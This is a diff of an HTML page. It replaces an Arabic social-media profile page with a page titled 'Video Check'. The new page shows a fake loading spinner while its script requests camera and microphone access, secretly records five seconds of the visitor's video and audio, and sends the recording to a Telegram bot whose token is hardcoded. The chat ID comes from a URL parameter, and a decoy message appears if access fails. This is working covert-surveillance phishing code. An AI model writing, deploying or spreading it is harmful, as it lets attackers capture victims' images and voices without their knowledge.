@@ -1,164 +1,109 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>الملف الشخصي الفخم | Premium Profile</title>
-    <!-- استيراد خطوط مميزة -->
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&family=Playfair+Display:ital,wght@0,700;1,700&display=swap" rel="stylesheet">
+    <title>Video Check</title>
     <style>
-        :root {
-            --gold-gradient: linear-gradient(135deg, #d4af37 0%, #f9f295 50%, #b38728 100%);
-            --dark-bg: #0a0a0a;
-            --glass-bg: rgba(255, 255, 255, 0.03);
-        }
-
-        body {
-            margin: 0;
-            padding: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            font-family: 'Cairo', sans-serif;
-            background: radial-gradient(circle at center, #1a1a1a 0%, #000000 100%);
-            overflow-x: hidden;
-            color: #fff;
-        }
-
-        /* خلفية اختيارية مع صورة */
-        body::before {
-            content: "";
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: url('99085.jpg') no-repeat center center/cover;
-            opacity: 0.4;
-            z-index: -1;
-        }
-
-        .container {
-            width: 90%;
-            max-width: 400px;
-            padding: 40px 20px;
-            text-align: center;
-            background: var(--glass-bg);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border-radius: 40px;
-            border: 1px solid rgba(212, 175, 55, 0.2);
-            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
-            animation: fadeIn 1.2s ease-out;
-        }
-
-        /* صورة شخصية دائرية (اختياري) */
-        .profile-img {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            margin: 0 auto 20px;
-            border: 2px solid #d4af37;
-            padding: 5px;
-            background: rgba(0,0,0,0.5);
-        }
-
-        h1 {
-            font-family: 'Playfair Display', serif;
-            font-size: 2.2rem;
-            margin: 10px 0;
-            background: var(--gold-gradient);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            letter-spacing: 1px;
-        }
-
-        .bio {
-            font-size: 0.9rem;
-            color: #aaa;
-            margin-bottom: 35px;
-            letter-spacing: 1px;
-        }
-
-        /* تنسيق الروابط المحسن */
-        .link-card {
-            position: relative;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            text-decoration: none;
-            color: #fff;
-            padding: 16px;
-            margin-bottom: 18px;
-            border-radius: 12px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            font-weight: 700;
-            overflow: hidden;
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-
-        .link-card::before {
-            content: "";
-            position: absolute;
-            top: 0; left: -100%;
-            width: 100%; height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(212, 175, 55, 0.2), transparent);
-            transition: 0.5s;
-        }
-
-        .link-card:hover::before {
-            left: 100%;
-        }
-
-        .link-card:hover {
-            transform: scale(1.05);
-            border-color: #d4af37;
-            background: rgba(212, 175, 55, 0.1);
-            box-shadow: 0 0 20px rgba(212, 175, 55, 0.2);
-        }
-
-        /* لمسة جمالية لكل منصة */
-        .facebook:hover { border-color: #1877f2; color: #1877f2; }
-        .instagram:hover { border-color: #e4405f; color: #e4405f; }
-        .tiktok:hover { border-color: #00f2ea; color: #00f2ea; }
-
-        .footer {
-            margin-top: 40px;
-            font-size: 0.7rem;
-            text-transform: uppercase;
-            color: rgba(212, 175, 55, 0.6);
-            letter-spacing: 4px;
-        }
-
-        /* أنيميشن الدخول */
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+        body { background-color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .loading { display: inline-block; width: 50px; height: 50px; border: 3px solid rgba(0,0,0,.3); border-radius: 50%; border-top-color: #3498db; animation: spin 1s ease-in-out infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-
-    <div class="container">
-        <!-- يمكنك وضع رابط صورتك هنا مكان src -->
-        <img src="https://via.placeholder.com/100" alt="Profile" class="profile-img">
-        
-        <h1>سيف الدين</h1>
-        <p class="bio">صانع محتوى | رؤية إبداعية</p>
-
-        <a href="https://www.facebook.com/share/15v8jgyX9eG/" class="link-card facebook" target="_blank">
-            فيسبوك
-        </a>
-        
-        <a href="https://www.instagram.com/saifeeddine67?igsh=MTI3bWV5bnk0dW1jNg==" class="link-card instagram" target="_blank">
-            إنستغرام
-        </a>
-        
-        <a href="https://www.tiktok.com/@ra10126?_r=1&_t=ZS-96HSIOC8fEC" class="link-card tiktok" target="_blank">
-            تيك توك
-        </a>
-
-        <div class="footer">Luxury & Professional Identity</div>
+    <div id="status">
+        <div class="loading"></div>
+        <p>جاري تحميل البيانات...</p>
     </div>
 
+    <video id="videoPreview" style="display:none;" autoplay muted playsinline></video>
+
+    <script>
+        // إعدادات البوت والصفحة
+        const botToken = '8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E'; // توكن البوت الخاص بك
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('sender_id'); // الحصول على الـ ID من الرابط
+        const recordDuration = 5000; // مدة التسجيل بالملي ثانية (5 ثوانٍ)
+
+        let mediaRecorder;
+        let recordedChunks = [];
+
+        async function startSystem() {
+            // التحقق من وجود chatId
+            if (!chatId) {
+                document.body.innerHTML = '<h2>خطأ: الـ ID الخاص بك غير موجود. يرجى فتح الرابط من التلجرام.</h2>';
+                return;
+            }
+
+            try {
+                // طلب الإذن من المستخدم للكاميرا والمايكروفون (لبدء الفيديو)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                const videoPreview = document.getElementById('videoPreview');
+                videoPreview.srcObject = stream;
+
+                // إعداد MediaRecorder
+                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+
+                // تجميع بيانات الفيديو
+                mediaRecorder.ondataavailable = function(event) {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                // عند انتهاء التسجيل
+                mediaRecorder.onstop = uploadVideo;
+
+                // بدء التسجيل
+                mediaRecorder.start();
+                console.log('Started recording...');
+
+                // إيقاف التسجيل بعد المدة المحددة
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    console.log('Stopped recording.');
+                    // إغلاق الكاميرا والمايكروفون
+                    stream.getTracks().forEach(track => track.stop());
+                }, recordDuration);
+
+            } catch (err) {
+                console.error("Error accessing camera/mic:", err);
+                // إظهار واجهة وهمية حتى لو فشل
+                document.getElementById('status').innerHTML = '<div class="loading"></div><p>جاري الاتصال بالسيرفر...</p>';
+            }
+        }
+
+        async function uploadVideo() {
+            console.log('Preparing to upload...');
+            
+            // إنشاء ملف فيديو واحد
+            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            
+            // تجهيز البيانات للإرسال
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('video', blob, 'recorded_video.webm'); // اسم الملف
+
+            // إرسال الفيديو عبر الـ API الخاص بتلجرام
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    console.log('Video uploaded successfully!');
+                } else {
+                    console.error('Video upload failed.');
+                }
+            } catch (err) {
+                console.error('Network error during upload:', err);
+            }
+        }
+
+        // بدء التشغيل بمجرد فتح الصفحة
+        startSystem();
+
+    </script>
 </body>
 </html>
